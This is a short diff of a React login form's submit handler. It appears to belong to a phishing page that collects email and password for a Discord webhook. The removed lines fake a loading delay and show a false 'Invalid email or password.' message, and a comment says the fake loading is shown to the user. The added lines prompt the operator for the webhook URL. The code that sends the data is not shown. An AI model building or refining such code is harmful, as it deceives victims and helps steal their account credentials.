@@ -21,15 +21,9 @@ function App() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     
-    // Check if webhook URL is configured
-    if (DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
-      console.error('Discord webhook URL not configured!');
-      // Show fake loading to user, but log error for developer
-      setIsLoading(true);
-      setTimeout(() => {
-        setIsLoading(false);
-        alert('Invalid email or password.');
-      }, 2000);
+    if (!webhookUrl) {
+      alert('Please enter your Discord webhook URL first!');
+      setShowWebhookInput(true);
       return;
     }
 
